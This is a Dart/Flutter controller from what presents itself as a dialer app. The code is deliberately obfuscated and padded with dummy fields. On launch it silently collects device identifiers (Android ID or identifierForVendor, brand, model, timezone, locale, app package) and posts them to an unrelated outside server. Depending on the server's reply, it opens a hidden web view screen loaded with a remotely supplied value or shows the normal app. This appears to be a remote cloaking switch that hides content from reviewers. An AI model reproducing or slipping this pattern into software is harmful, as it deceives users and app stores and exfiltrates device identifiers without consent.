import 'dart:io';

import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

void qkanvkhsd() async {
  var connectResult = await (Connectivity().checkConnectivity());
  if(connectResult == ConnectivityResult.none){
    Get.toNamed("/dialStart");
  }
}

class DialLibrayLogic extends GetxController {

  var opxnvkqjf = RxBool(false);
  var crnpgisla = RxBool(true);
  var ponl = RxString("");
  var lavina = RxBool(false);
  var dubuque = RxBool(true);
  final sckgvxr = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    qkanvkhsd();
    ufxrayn();
  }


  Future<void> ufxrayn() async {

    lavina.value = true;
    dubuque.value = true;
    crnpgisla.value = false;

    sckgvxr.post("https://put.infinitlp.com/gonlakuqedicsrj",data: await lubnvsamyr()).then((value) {
      var vghjkz = value.data["vghjkz"] as String;
      var szrmqc = value.data["szrmqc"] as bool;
      if (szrmqc) {
        ponl.value = vghjkz;
        joey();
      } else {
        miller();
      }
    }).catchError((e) {
      crnpgisla.value = true;
      dubuque.value = true;
      lavina.value = false;
    });
  }

  Future<Map<String, dynamic>> lubnvsamyr() async {
    final DeviceInfoPlugin swtgvpey = DeviceInfoPlugin();
    PackageInfo taxwrbgc_cgpm = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var vnysdcq = Platform.localeName;
    var wrelnst = currentTimeZone;

    var bwxcfelp = taxwrbgc_cgpm.packageName;
    var qmgicran = taxwrbgc_cgpm.version;
    var enoayhl = taxwrbgc_cgpm.buildNumber;

    var rinu = taxwrbgc_cgpm.appName;
    var nbcmqoza = "";
    var xjnavl  = "";
    var fsmzrd = "";
    var ilaLeuschke = "";
    var abelardoSanford = "";
    var javierPagac = "";
    var haydenPagac = "";
    var anaisVon = "";
    var vidalWehner = "";
    var websterFriesen = "";


    var imgsd = "";
    var bpvdcws = false;

    if (GetPlatform.isAndroid) {
      imgsd = "android";
      var kstwhnaveg = await swtgvpey.androidInfo;

      fsmzrd = kstwhnaveg.brand;

      nbcmqoza  = kstwhnaveg.model;
      xjnavl = kstwhnaveg.id;

      bpvdcws = kstwhnaveg.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      imgsd = "ios";
      var nqayvxp = await swtgvpey.iosInfo;
      fsmzrd = nqayvxp.name;
      nbcmqoza = nqayvxp.model;

      xjnavl = nqayvxp.identifierForVendor ?? "";
      bpvdcws  = nqayvxp.isPhysicalDevice;
    }
    var res = {
      "rinu": rinu,
      "enoayhl": enoayhl,
      "bwxcfelp": bwxcfelp,
      "nbcmqoza": nbcmqoza,
      "abelardoSanford" : abelardoSanford,
      "wrelnst": wrelnst,
      "fsmzrd": fsmzrd,
      "xjnavl": xjnavl,
      "vnysdcq": vnysdcq,
      "imgsd": imgsd,
      "ilaLeuschke" : ilaLeuschke,
      "javierPagac" : javierPagac,
      "bpvdcws": bpvdcws,
      "qmgicran": qmgicran,
      "haydenPagac" : haydenPagac,
      "anaisVon" : anaisVon,
      "vidalWehner" : vidalWehner,
      "websterFriesen" : websterFriesen,

    };
    return res;
  }

  Future<void> miller() async {
    Get.offAllNamed("/dialMain");
  }

  Future<void> joey() async {
    Get.offAllNamed("/dialMonth");
  }

}
